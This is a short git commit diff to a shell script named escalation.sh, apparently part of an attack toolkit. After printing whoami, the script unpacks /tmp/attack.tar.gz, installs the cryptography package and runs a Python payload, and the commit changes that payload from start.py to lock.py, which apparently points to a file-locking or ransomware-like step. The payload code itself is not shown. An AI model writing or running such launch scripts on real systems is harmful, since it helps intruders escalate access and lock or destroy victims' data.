1971634c04949d499f1984ace68c1189b55a07fc
comet959 <1376723538@qq.com>
2026-01-12 23:14:17 +0800

    update

--- escalation.sh
+++ escalation.sh
@@ -4,4 +4,4 @@ whoami
 echo "========== End ==========="
 
 echo "===== Start Escalation =========="
-cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 ./start.py
+cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 ./lock.py
